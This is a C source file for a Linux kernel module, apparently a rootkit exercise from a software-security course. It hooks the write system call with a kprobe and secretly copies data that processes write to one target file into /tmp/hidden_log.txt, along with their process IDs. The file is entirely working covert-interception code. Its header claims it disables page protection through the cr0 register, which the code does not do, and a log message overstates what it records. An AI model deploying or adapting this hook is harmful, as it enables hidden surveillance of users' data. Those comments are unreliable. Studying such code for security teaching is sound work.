/*
 * syscall-steal.c
 *
 * System call "stealing" sample.
 *
 * This module hooks into the `write` system call using kprobes to monitor
 * and log write operations to a specific target file. It demonstrates
 * kernel-level interception of system calls and logging of user-space
 * activity.
 *
 * Disables page protection at a processor level by changing the 16th bit
 * in the cr0 register (could be Intel specific).
 */

#include <linux/delay.h>
#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/moduleparam.h> /* For module parameters */
#include <linux/unistd.h>      /* For system call numbers */
#include <linux/cred.h>        /* For current_uid() */
#include <linux/uidgid.h>      /* For __kuid_val() */
#include <linux/version.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/fcntl.h>
#include <linux/file.h>    /* For fget and fput */
#include <linux/fdtable.h> /* For fdget and fdput */
#include <linux/sched.h>
#include <linux/uaccess.h>
#include <linux/kprobes.h> /* For kprobes API */

#define TARGET_FILE "/home/rootkit/IntroToSoftwareSec/Rootkit-8/log.txt" // Target file to monitor

// Module parameter to allow dynamic configuration of the syscall symbol
static char *syscall_sym = "__x64_sys_write";
module_param(syscall_sym, charp, 0644); // Allow setting via module parameters

/*
 * Pre-handler for the kprobe.
 * This function is executed before the hooked system call (`write`) is executed.
 * It checks if the write operation is targeting the specified file and logs the
 * operation details to a hidden log file.
 */
static int sys_call_kprobe_pre_handler(struct kprobe *p, struct pt_regs *regs)
{
    struct file *log_file; // File pointer for the hidden log file
    char buf[256] = {0};   // Buffer to store log messages
    char path_buf[PATH_MAX] = {0}; // Buffer to store the file path
    char *path;            // Pointer to the resolved file path

    struct pt_regs *real_regs; // Registers passed to the system call
    unsigned int fd;           // File descriptor
    const char __user *user_buf; // User-space buffer being written
    size_t count;              // Number of bytes to write

    // Extract arguments from the registers
    real_regs = (struct pt_regs *)regs->di;
    if (!real_regs) {
        pr_info("Invalid regs pointer\n");
        return 0;
    }

    fd = (unsigned int)real_regs->di; // File descriptor
    user_buf = (const char __user *)real_regs->si; // User buffer
    count = (size_t)real_regs->dx; // Byte count

    // Validate file descriptor range
    if (fd >= 1024) {
        pr_info("File descriptor %u out of usual range\n", fd);
        return 0;
    }

    // Get the file structure for the file descriptor
    struct fd f = fdget(fd);
    if (!f.file) {
        pr_info("Invalid file descriptor %d\n", fd);
        return 0;
    }

    // Resolve the file path
    path = d_path(&f.file->f_path, path_buf, PATH_MAX);
    if (IS_ERR(path)) {
        pr_info("Error getting path for fd %d: %ld\n", fd, PTR_ERR(path));
        fdput(f);
        return 0;
    }

    // Check if the file matches the target file
    if (strcmp(path, TARGET_FILE) != 0) {
        fdput(f);
        return 0;
    }

    pr_info("Matched target file! Logging write operation\n");

    // Log the write operation details
    if (count > 0 && user_buf) {
        char tmp_buf[128] = {0}; // Temporary buffer for user data
        size_t to_copy = min_t(size_t, count, sizeof(tmp_buf) - 1);

        // Safely copy data from user space
        if (copy_from_user(tmp_buf, user_buf, to_copy) == 0) {
            snprintf(buf, sizeof(buf), "Process %d wrote: %.100s\n",
                     current->pid, tmp_buf);
        } else {
            snprintf(buf, sizeof(buf), "Process %d wrote to file (copy failed)\n",
                     current->pid);
        }
    } else {
        snprintf(buf, sizeof(buf), "Process %d wrote %zu bytes\n",
                 current->pid, count);
    }

    // Open the hidden log file for appending
    log_file = filp_open("/tmp/hidden_log.txt", O_WRONLY | O_CREAT | O_APPEND, 0644);
    if (IS_ERR(log_file)) {
        pr_err("Failed to open hidden log file: %ld\n", PTR_ERR(log_file));
        fdput(f);
        return 0;
    }

    // Write the log message to the hidden log file
    kernel_write(log_file, buf, strlen(buf), &log_file->f_pos);

    // Close the log file and release the file descriptor
    filp_close(log_file, NULL);
    fdput(f);

    return 0;
}

// Define the kprobe structure
static struct kprobe syscall_kprobe = {
    .symbol_name = "__x64_sys_write", // Default symbol to hook
    .pre_handler = sys_call_kprobe_pre_handler, // Pre-handler function
};

/*
 * Module initialization function.
 * Registers the kprobe for the specified system call.
 */
static int __init syscall_steal_start(void)
{
    int err;
    pr_info("Module loading with kernel %d.%d.%d\n",
            (LINUX_VERSION_CODE >> 16),
            ((LINUX_VERSION_CODE >> 8) & 0xFF),
            (LINUX_VERSION_CODE & 0xFF));

    // Update the symbol name if provided via module parameter
    syscall_kprobe.symbol_name = syscall_sym;

    // Register the kprobe
    err = register_kprobe(&syscall_kprobe);
    if (err) {
        pr_err("register_kprobe() on %s failed: %d\n", syscall_sym, err);
        return err;
    }
    pr_info("Registered kprobe for %s\n", syscall_sym);
    pr_info("Logging all write syscalls to /tmp/hidden_log.txt\n");
    return 0;
}

/*
 * Module cleanup function.
 * Unregisters the kprobe and performs cleanup.
 */
static void __exit syscall_steal_end(void)
{
    unregister_kprobe(&syscall_kprobe); // Unregister the kprobe
    pr_info("Unregistered kprobe for %s\n", syscall_sym);
    msleep(2000); // Delay to ensure proper cleanup
}

module_init(syscall_steal_start);
module_exit(syscall_steal_end);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Imri Shai And Hagay Cohen");
MODULE_DESCRIPTION("Write to specific file hook");

